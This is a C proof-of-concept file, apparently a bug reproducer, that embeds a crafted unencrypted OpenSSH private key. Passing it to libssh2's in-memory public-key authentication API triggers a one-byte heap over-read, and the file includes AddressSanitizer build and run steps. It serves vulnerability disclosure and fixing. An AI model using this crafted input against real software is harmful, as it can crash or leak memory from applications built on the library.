/* PoC: out-of-bounds read while parsing a crafted unencrypted
 * ("none" cipher) openssh-key-v1 private key via the public API
 * libssh2_userauth_publickey_frommemory().
 *
 * The decrypted private section ends exactly with the embedded key-type
 * string, so the type string is not null-terminated inside the decrypted
 * buffer. The OpenSSH key backend compares that string against known key
 * types; the ECDSA curve-name path reads it as a C string (strlen/strcmp)
 * and runs one byte past the end of the heap allocation.
 *
 * No network I/O is performed: the key is parsed locally before any
 * transport is established.
 *
 * Build (against the ASan static lib):
 *   cc -fsanitize=address -I<srcroot>/include pocs/residual.c \
 *        <build>/src/libssh2.a -lssl -lcrypto -lz -o /tmp/residual
 * Run:
 *   /tmp/residual
 */

#include <libssh2.h>
#include <stdio.h>

static const char privkey[] =
    "-----BEGIN OPENSSH PRIVATE KEY-----\n"
    "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAABEFBQUEAAAAfAQ\n"
    "IDBAECAwQAAAATZWNkc2Etc2hhMi1uaXN0cDI1Ng==\n"
    "-----END OPENSSH PRIVATE KEY-----\n";

int main(void)
{
    LIBSSH2_SESSION *session;
    int rc;

    if(libssh2_init(0)) {
        fprintf(stderr, "libssh2_init failed\n");
        return 2;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "session_init failed\n");
        return 2;
    }

    /* Parses the private key in memory and derives the public key.
       This happens before any socket activity. */
    rc = libssh2_userauth_publickey_frommemory(session,
                                               "user", 4,
                                               NULL, 0,
                                               privkey, sizeof(privkey) - 1,
                                               NULL);

    fprintf(stderr, "frommemory returned %d (no crash)\n", rc);

    libssh2_session_free(session);
    libssh2_exit();
    return 0;
}
